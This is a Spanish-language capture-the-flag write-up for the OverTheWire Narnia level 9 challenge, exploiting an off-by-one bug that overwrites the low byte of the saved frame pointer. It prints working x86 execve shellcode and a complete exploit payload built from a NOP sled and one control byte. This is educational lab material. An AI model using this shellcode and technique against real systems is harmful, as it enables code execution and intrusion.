*[Image: banner]*

```bash
$ ssh narnia9@narnia.labs.overthewire.org -p 2226

$ echo $TARGET
> mil veinticuatro bytes de espacio · mil veinticinco iteraciones · un byte que mueve el cimiento

$ echo $VECTOR
> off-by-one overflow · LSB corruption · frame pointer hijack · control de flujo por desplazamiento
```

---

## `> [RECON]`

```bash
$ cat /narnia/narnia9.c
```

```c
char buffer[1024];
[...]
for(i = 0; i <= 1024; i++) {
    buffer[i] = argv[1][i];
}
```

`<=` en vez de `<`.

Un carácter. El programador validó el tamaño del buffer.
Contó bien. Asignó bien.
Escribió el bucle mal.

El buffer tiene índices del `0` al `1023`.
El bucle itera hasta `1024` inclusive.
Una iteración de más. Un byte fuera del límite.

No necesitas más.

---

## `> [HYPOTHESIS]`

```diff
+ i <= 1024 → el bucle ejecuta 1025 veces. el buffer tiene espacio para 1024.
+ el byte 1024 se escribe fuera del límite: exactamente sobre el LSB del Saved EBP.
+ modificar el LSB del EBP desplaza la base del stack frame del llamador.
+ cuando la función ejecuta leave → ret, el EIP se lee desde una dirección que controlamos.
+ no necesitamos cuatro bytes del EIP. nos basta con uno del EBP.
- intenté un overflow clásico de 200 bytes. no era ese el vector.
- no vi que <= en vez de < era suficiente para romper todo.
- ignoré el EBP como objetivo. estaba mirando el EIP.
```

---

## `> [ATTEMPTS]`

<details>
<summary><code>// un s0l0 byt3 mu3v3 3l c1m13nt0.</code></summary>

```bash
#: intento 1
# probar que el byte extra existe y colapsa algo.
$ /narnia/narnia9 $(python3 -c 'print("A"*1024 + "\x00")')
# Segmentation fault
# el EBP fue alterado. el stack frame del llamador apunta a basura.
# el crash confirma que el byte 1024 llegó al EBP.

#: intento 2
# necesitamos que el byte extra no sea \x00: necesitamos controlarlo.
# el LSB del EBP determina a dónde apunta la base del frame llamador.
# si lo ajustamos para que apunte dentro de nuestro buffer,
# el ret posterior leerá el EIP desde ahí.
$ /narnia/narnia9 $(python3 -c 'print("A"*1024 + "\x40")')
# diferente crash. el EBP apunta a una dirección distinta.
# el byte controla el destino. confirmado.

#: intento 3
# construimos el buffer con shellcode al principio, NOP sled de relleno,
# y calculamos qué valor del LSB hace que EBP apunte dentro del NOP sled.
# la dirección del buffer en la pila es aproximadamente 0xffffd400.
# queremos que el nuevo EBP apunte a 0xffffd440: dentro del NOP sled.
# el LSB que necesitamos: 0x40.

#: intento 4: ahí.
$ /narnia/narnia9 $(python3 -c '
import sys
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
nop_sled  = b"\x90" * (1024 - len(shellcode))
lsb       = b"\x40"   # byte que apunta el EBP dentro del NOP sled
sys.stdout.buffer.write(shellcode + nop_sled + lsb)
')
```

```txt
LSB del EBP: controlado.
frame pointer: desplazado.
EIP: leído desde el buffer.
shell: narnia10.
```

</details>

---

## `> [BREAK]`

La pila antes:

```
direcciones bajas ↓

  [     buffer (1024 bytes)     ] [ Saved EBP ] [ Saved EIP ]
   0 ........................1023   1024..1027    1028..1031

direcciones altas ↑
```

El byte 1024: el que sobra: cae exactamente sobre el LSB del Saved EBP.

```
  Saved EBP antes:  0xffffd4b8
  LSB modificado:   0xffffd440   ← apunta dentro del NOP sled
```

Cuando la función ejecuta `leave`:

```nasm
mov esp, ebp   ← ESP apunta a 0xffffd440
pop ebp        ← EBP se restaura desde ahí
```

Cuando ejecuta `ret`:

```nasm
pop eip        ← EIP se lee desde 0xffffd444
jmp eip        ← la CPU salta al NOP sled → shellcode
```

No demoliste la pila.
Moviste el cimiento un byte.
La estructura entera cayó hacia donde señalabas.

Piensa en una columna de concreto con el base desplazada dos centímetros.
Desde arriba todo se ve igual.
El edificio carga igual. Funciona igual.
Hasta que no.
Un solo punto de apoyo mal alineado
y la gravedad hace el resto.

En 1998, klog publicó en Phrack 55 que no necesitas cuatro bytes del EIP
si tienes un byte del EBP.
Que el objetivo más obvio no siempre es el más eficiente.
Que a veces el puntero que nadie vigila
es el que mueve todo lo demás.

> *→ [`/lore/klog_phrack55.md`](../lore/klog_phrack55.md)*

---

## `> [EXPLOIT]`

```bash
/narnia/narnia9 $(python3 -c '
import sys
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
nop_sled  = b"\x90" * (1024 - len(shellcode))
lsb       = b"\x40"
sys.stdout.buffer.write(shellcode + nop_sled + lsb)
')
```

```
shellcode (24 bytes)    → al principio del buffer. donde apuntará el EIP.
\x90 * (1024-24)        → NOP sled. rellena el resto del buffer.
                           margen de error para el salto.
lsb = \x40              → el byte 1025. el único que importa.
                           no pisa el EIP. pisa el LSB del EBP.
                           un byte que reorienta toda la cadena de retorno.
```

---

## `> [FLAG]`

```
[REDACTED]
```

> n0 m3 l4 d1g4s. n0 m3 1nt3r3s4.
> 3l pr3m10 n0 3s un str1ng d3 t3xt0.

---

## `> [REFLECTION]`

```diff
+ <= en vez de <: un carácter en el código. un byte en la pila. suficiente.
+ el EBP es un objetivo tan válido como el EIP. a veces más silencioso.
+ un solo byte del LSB controla a dónde apunta el frame del llamador.
+ shellcode al principio del buffer: el EIP la encuentra sin NOP sled largo.
- buscar overflow clásico donde el vector es off-by-one → vector incorrecto.
- ignorar el EBP porque parece menos importante que el EIP → error de perspectiva.
```

---

## `> echo $CHALLENGE`

Un byte.
No cuatro. No ciento veintiocho. Uno.

klog lo demostró en 1998 y la industria tardó años en tomarlo en serio.
Hoy los compiladores modernos tienen protecciones específicas contra esto: stack canaries, shadow stacks, frame pointer hardening.

Busca **CVE-2015-7547**: una vulnerabilidad off-by-one en glibc
que afectó prácticamente todo sistema Linux en producción.
Busca cuántos sistemas la tenían sin saberlo.
Busca cuánto tardó en parchearse desde que se descubrió.

El que lo encuentra entiende que
el error más pequeño posible
no es el menos peligroso.
Es el más difícil de ver.

---

```
█████████████████████████████████████████████
█                                           █
█   n0 n3c3s1t4b4s cu4tr0 byt3s.          █
█         s0l0 un0.                        █
█              3l qu3 n4d13 v3í4.          █
█                                           █
█████████████████████████████████████████████
```
> *→[https://youtube.com/t474-r0b07](https://youtube.com/@kaderd.garnica?si=9vk1E6Gkkb7LftTK)*
---

> *→ anterior: [narnia8](narnia08.md)**→ siguiente: [narnia10](narnia10.md)*

> > 🔴 **EL RASTRO CONTINÚA**
>
> Un byte movió el cimiento. El plano completo está más abajo.
>
> 🧭 **[ÍNDICE DEL LORE](https://github.com/t474-r0b07/ctf-writeups/tree/main/lore)**

---
<!-- 0x3c 0x3d // 3l 3rr0r n0 3r4 3l buff3r. 3r4 3l 0p3r4d0r. -->
